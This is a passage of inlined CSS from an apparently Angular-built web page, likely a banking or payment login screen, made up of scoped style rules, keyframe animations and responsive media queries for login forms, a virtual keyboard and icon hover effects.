        .ipswich-main-content-check[_ngcontent-c41] label.ipswich-main-content-check-label[_ngcontent-c41]:before {
            border-radius: 0
        }

        input.ipswich-main-content-check-input[type=checkbox][_ngcontent-c41]:checked+label.ipswich-main-content-check-label[_ngcontent-c41]:before {
            content: "";
            font-size: 11px;
            color: #0097c1;
            text-align: center;
            line-height: 15px;
            font-weight: 700;
            font-family: streamline;
            border: 1px solid #0097c1
        }

        .blackburn[_ngcontent-c41] {
            width: 940px;
            padding: 20px 30px 0;
            position: absolute;
            margin-top: 35px;
            margin-bottom: 20px
        }

        .blackburn[_ngcontent-c41] i[_ngcontent-c41] {
            color: #666;
            display: inline-block;
            margin-right: 7px;
            vertical-align: top;
            padding-top: 4px
        }

        .blackburn-disclaimer[_ngcontent-c41] {
            color: #666;
            display: inline-block;
            width: calc(100% - 40px);
            font-size: 12px;
            vertical-align: top;
            line-height: 1.7
        }

        .blackburn.no-show[_ngcontent-c41] {
            display: none
        }

        @media only screen and (max-width:1365px) and (min-width:768px) {
            .ipswich[_ngcontent-c41] {
                width: 940px;
                margin: -54px auto 0;
                border: 1px solid #e1e1e1;
                position: relative;
                background: #fff;
                -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
                box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
                overflow: hidden !important
            }
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .blackburn[_ngcontent-c41] {
                width: 740px
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .blackburn[_ngcontent-c41] {
                display: none
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .ipswich[_ngcontent-c41] {
                width: 100%;
                margin: 0 auto;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }
        }

        @media only screen and (max-width:639px) and (min-width:480px) {
            .ipswich[_ngcontent-c41] {
                width: 100%;
                margin: 0 auto;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .ipswich[_ngcontent-c41] {
                width: 100%;
                margin: 0 auto;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-main-content-check[_ngcontent-c41],
            .ipswich-main-content-text[_ngcontent-c41] {
                margin-right: 30px;
                margin-left: 30px
            }

            .ipswich-main-firm-data[_ngcontent-c41] {
                padding-right: 30px;
                padding-left: 30px
            }
        }
    </style>
<style>
        .madrid_banner_image[_ngcontent-c42] {
            max-width: 100%;
            display: block
        }

        .madrid_banner_image.madrid_banner_image_hasLink[_ngcontent-c42]:hover {
            cursor: pointer
        }

        @media all and (-ms-high-contrast:none),
        (-ms-high-contrast:active) {
            icb-carouselSlide[_ngcontent-c42] {
                display: inline-block;
                margin-right: -4px;
                margin-bottom: -5px
            }
        }

        @-moz-document url-prefix() {
            icb-carouselSlide {
                display: inline-block;
                margin-right: -4px;
                margin-bottom: -5px
            }
        }
    </style>
<style>
        .venecia-main-form-label-parent[_ngcontent-c43] {
            display: inline-block
        }

        .venecia-main-form-label[_ngcontent-c43] {
            display: inline-block;
            font-size: 12px;
            color: #666;
            width: 146px;
            vertical-align: top
        }

        .venecia-main-form-content[_ngcontent-c43] {
            display: inline-block
        }

        .venecia-main-form-label-readonly[_ngcontent-c43] {
            display: inline-block;
            font-size: 12px;
            color: #666;
            width: 146px;
            vertical-align: top;
            padding-top: 2px
        }

        .venecia-main-form-label-readonly[_ngcontent-c43]:after {
            content: ':'
        }

        .ipswich-main-form-title[_ngcontent-c43] {
            font-size: 16px;
            margin: 16px 0;
            padding: 0;
            color: #12447f;
            font-weight: 400
        }

        .venecia-main-warning-label[_ngcontent-c43] {
            font-size: 14px;
            color: #444;
            display: block;
            margin-bottom: 10px
        }

        .venecia-main-form[_ngcontent-c43] {
            padding: 0 0 20px
        }

        .venecia-main-item-link[_ngcontent-c43] {
            color: #0097c1;
            font-size: 14px;
            cursor: pointer
        }

        .venecia-main-item-link[_ngcontent-c43]:hover {
            color: #005b75;
            text-decoration: underline
        }

        @-webkit-keyframes venecia-main-item-link-animated {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @keyframes venecia-main-item-link-animated {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @-webkit-keyframes venecia-main-item-link-reverse {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @keyframes venecia-main-item-link-reverse {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @media only screen and (min-width:640px) {
            .venecia-main-form-label-parent[_ngcontent-c43] {
                display: inline-block;
                vertical-align: top;
                min-height: 30px;
                padding-top: 2px
            }
        }
    </style>
<style>
        .prizren.privateMode[_ngcontent-c44] {
            padding: 6px 10px 0
        }

        .prizren.privateMode[_ngcontent-c44] .prizren-faq-separator[_ngcontent-c44] {
            padding: 6px 0 4px
        }

        .prizren[_ngcontent-c44] .prizren-faq-content[_ngcontent-c44] {
            padding: 0 0 6px
        }

        .prizren[_ngcontent-c44] .prizren-faq-content[_ngcontent-c44] .prizren-faq-content-title[_ngcontent-c44] {
            font-size: 14px;
            color: #12447f
        }

        .prizren[_ngcontent-c44] .prizren-faq-content[_ngcontent-c44] .prizren-faq-content-description[_ngcontent-c44] {
            font-size: 12px;
            color: #8a8a8a;
            display: block;
            padding-top: 4px
        }

        .prizren[_ngcontent-c44] .prizren-faq-separator[_ngcontent-c44] {
            padding: 6px 0 10px
        }

        .prizren[_ngcontent-c44] .prizren-faq-separator[_ngcontent-c44] .prizren-faq-separator-line[_ngcontent-c44] {
            height: 1px;
            border-top: 1px solid #e1e1e1
        }
    </style>
<style>
        @-webkit-keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @-webkit-keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @-webkit-keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @-webkit-keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @-webkit-keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @-webkit-keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @-webkit-keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @-webkit-keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @-webkit-keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @-webkit-keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @-webkit-keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @-webkit-keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @-webkit-keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @-webkit-keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @-webkit-keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @-webkit-keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @-webkit-keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @-webkit-keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @-webkit-keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        @keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        .keyboard-container[_ngcontent-c45] {
            width: 100px;
            display: inline
        }

        .ipswich-main-keyboard[_ngcontent-c45] {
            text-align: right;
            padding: 10px 2px 6px
        }

        .ipswich-main-keyboard-link[_ngcontent-c45] {
            color: #0097c1;
            font-size: 12px;
            text-align: right;
            display: inline-block;
            border-bottom: 1px solid transparent;
            cursor: pointer;
            -webkit-animation: .2s fromSharktoBettafighterBorderBottom;
            animation: .2s fromSharktoBettafighterBorderBottom
        }

        .ipswich-main-keyboard-link[_ngcontent-c45]:hover {
            color: #0097c1;
            cursor: pointer;
            border-bottom: 1px solid #0097c1;
            -webkit-animation: .2s fromBettafightertoSharkBorderBottom;
            animation: .2s fromBettafightertoSharkBorderBottom
        }

        .ipswich-main-keyboard.active[_ngcontent-c45] {
            color: red
        }

        .keyboard-image-container[_ngcontent-c45] {
            display: block;
            height: 170px
        }

        .keyboard-checkbox-container[_ngcontent-c45] {
            display: block;
            height: 28px;
            background-color: #fff;
            border-top: 1px solid gray;
            color: #000;
            text-align: center
        }

        .keyboard-contrast[_ngcontent-c45] {
            padding: 5px;
            vertical-align: middle;
            color: #333;
            font-size: 12px
        }

        .virtual-keyboard[_ngcontent-c45] input[type=radio][_ngcontent-c45] {
            vertical-align: middle
        }

        .virtual-keyboard[_ngcontent-c45] input[type=radio][_ngcontent-c45]:checked+label[_ngcontent-c45] {
            color: #333;
            font-size: 12px
        }

        .keyboard-image-container[_ngcontent-c45] map[_ngcontent-c45] area[_ngcontent-c45] {
            cursor: pointer
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich-main-keyboard[_ngcontent-c45] {
                padding-top: 6px
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .ipswich-main-keyboard[_ngcontent-c45] {
                padding: 8px 2px 6px
            }
        }
    </style>
<style>
        .ipswich[_ngcontent-c46] {
            width: 940px;
            margin: -54px auto 0;
            border: 1px solid #e1e1e1;
            position: relative;
            background: #fff;
            min-height: 380px;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1)
        }

        .ipswich-advertising[_ngcontent-c46] {
            height: 380px;
            width: 360px
        }

        .ipswich-main-firm-data[_ngcontent-c46] {
            padding: 0 18px
        }

        .ipswich-main-subtitle-description[_ngcontent-c46] {
            font-size: 14px;
            color: #444;
            padding: 5px 0 0
        }

        .error-message[_ngcontent-c46] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            margin: 5px 0 0;
            padding: 0
        }

        .ok-message[_ngcontent-c46] {
            color: green;
            font-weight: 500;
            display: block;
            width: 100%;
            margin: 5px 0 0;
            padding: 0
        }

        .login-utils-link-message[_ngcontent-c46]:hover {
            text-decoration: underline;
            color: #005b75
        }

        .main-container-login-utils[_ngcontent-c46] {
            margin: 10px 0 4px
        }

        .ipswich-main-footer-description[_ngcontent-c46] {
            font-size: 12px;
            color: #444;
            display: inline-block;
            margin-top: 10px
        }

        .ipswich-main-footer-description[_ngcontent-c46] .login-utils-link-message[_ngcontent-c46] {
            display: inline
        }

        .blackburn[_ngcontent-c46] {
            width: 940px;
            margin: 0 auto;
            padding: 20px 30px 0
        }

        .blackburn[_ngcontent-c46] i[_ngcontent-c46] {
            color: #666;
            display: inline-block;
            margin-right: 7px;
            vertical-align: top;
            padding-top: 4px
        }

        .blackburn-disclaimer[_ngcontent-c46] {
            color: #666;
            display: inline-block;
            width: calc(100% - 40px);
            font-size: 12px;
            vertical-align: top;
            line-height: 1.7
        }

        .blackburn.no-show[_ngcontent-c46] {
            display: none
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich[_ngcontent-c46] {
                width: 740px;
                margin: -54px auto 0;
                min-height: auto
            }

            .blackburn[_ngcontent-c46] {
                width: 740px
            }

            .ipswich-advertising[_ngcontent-c46] {
                width: 280px
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .blackburn[_ngcontent-c46] {
                display: none
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .ipswich[_ngcontent-c46] {
                width: 100%;
                margin: 0 auto;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c46] {
                float: none;
                margin: auto
            }
        }

        @media only screen and (max-width:639px) and (min-width:480px) {
            .ipswich[_ngcontent-c46] {
                width: 100%;
                margin: 0 auto;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c46] {
                float: none;
                margin: auto
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .ipswich[_ngcontent-c46] {
                width: 100%;
                margin: 0 auto;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c46] {
                float: none;
                margin: auto
            }
        }

        .login-utils-message[_ngcontent-c46] {
            font-weight: 500;
            display: inline;
            width: 100%;
            margin: 18px 0 0;
            padding: 0;
            text-align: left;
            color: #444;
            font-size: 12px;
            cursor: pointer
        }

        .login-utils-link-message[_ngcontent-c46] {
            font-weight: 500;
            display: block;
            width: 100%;
            margin: 18px 0 0;
            padding: 0;
            text-align: left;
            color: #0097c1;
            font-size: 12px;
            cursor: pointer
        }

        .main-container-login-utils[_ngcontent-c46] .ipswich-main-footer-description[_ngcontent-c46] {
            padding-bottom: 8px;
            width: 146px
        }

        .ipswich-main-footer-description[_ngcontent-c46] .ipswich-main-footer-description-label[_ngcontent-c46] {
            width: 146px
        }
    </style>
<style>
        .tokyo_icon[_ngcontent-c46] {
            font-size: 18px;
            padding: 6px 6px 6px 3px;
            cursor: pointer;
            position: relative
        }

        .tokyo_icon.preregisteredMode[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.preregisteredMode[_ngcontent-c46]:hover .belek-background[_ngcontent-c46] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animatedPreRegistered;
            animation: .1s belek-animatedPreRegistered;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.addHocMode[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.addHocMode[_ngcontent-c46]:hover .belek-background[_ngcontent-c46] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animatedPreRegistered;
            animation: .1s belek-animatedPreRegistered;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.debtRowMode[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.debtRowMode[_ngcontent-c46]:hover .belek-background[_ngcontent-c46] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animatedPreRegistered;
            animation: .1s belek-animatedPreRegistered;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.singleOnlineDebtMode[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.singleOnlineDebtMode[_ngcontent-c46]:hover .belek-background[_ngcontent-c46] {
            top: 9px;
            left: -2px;
            -webkit-animation: .1s belek-animatedSingleDebt;
            animation: .1s belek-animatedSingleDebt;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.textHelpMode[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.textHelpMode[_ngcontent-c46] .linkTextResource[_ngcontent-c46] {
            color: #0097c1;
            font-size: 12px;
            display: inline-block
        }

        .tokyo_icon.textHelpMode[_ngcontent-c46] .linkTextResource[_ngcontent-c46]:hover {
            color: #005b75
        }

        .tokyo_icon.textHelpMode[_ngcontent-c46] .linkTextResource[_ngcontent-c46]+i[_ngcontent-c46] {
            font-size: 12px
        }

        .tokyo_icon.textHelpMode[_ngcontent-c46]:hover .linkTextResource[_ngcontent-c46] {
            color: #005b75
        }

        .tokyo_icon.textHelpMode[_ngcontent-c46]:hover .belek-background[_ngcontent-c46] {
            top: 10px;
            left: -1px;
            -webkit-animation: .1s belek-animatedHelpTextbox;
            animation: .1s belek-animatedHelpTextbox;
            height: 20px;
            width: 60px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.servicesubscriptionMode[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.servicesubscriptionMode[_ngcontent-c46]:hover .belek-background[_ngcontent-c46] {
            top: 10px;
            left: 0;
            -webkit-animation: .1s belek-animatedServiceSubscription;
            animation: .1s belek-animatedServiceSubscription;
            height: 20px;
            width: 21px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.servicesubscriptionMode[_ngcontent-c46] i[_ngcontent-c46] {
            font-size: 14px
        }

        .tokyo_icon.detailaccoutMode[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.detailaccoutMode[_ngcontent-c46]:hover .belek-background[_ngcontent-c46] {
            top: 10px;
            left: -1px;
            -webkit-animation: .1s belek-animatedAccountDetail;
            animation: .1s belek-animatedAccountDetail;
            height: 19px;
            width: 22px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.detailaccoutMode[_ngcontent-c46] i[_ngcontent-c46] {
            font-size: 14px
        }

